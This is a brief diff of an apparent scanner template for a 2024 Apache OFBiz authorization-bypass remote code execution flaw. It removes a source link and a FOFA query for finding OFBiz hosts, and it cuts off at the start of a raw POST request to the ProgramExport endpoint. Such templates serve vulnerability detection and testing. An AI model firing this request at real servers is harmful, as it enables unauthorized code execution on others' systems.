@@ -3,12 +3,8 @@ info:
   name: Apache OFBiz 授权不当致远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fhlfv9avvwb9rsuh'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fhlfv9avvwb9rsuh
-    fofa: app="Apache_OFBiz"
 http:
 - raw:
   - 'POST /webtools/control/main/ProgramExport HTTP/1.1
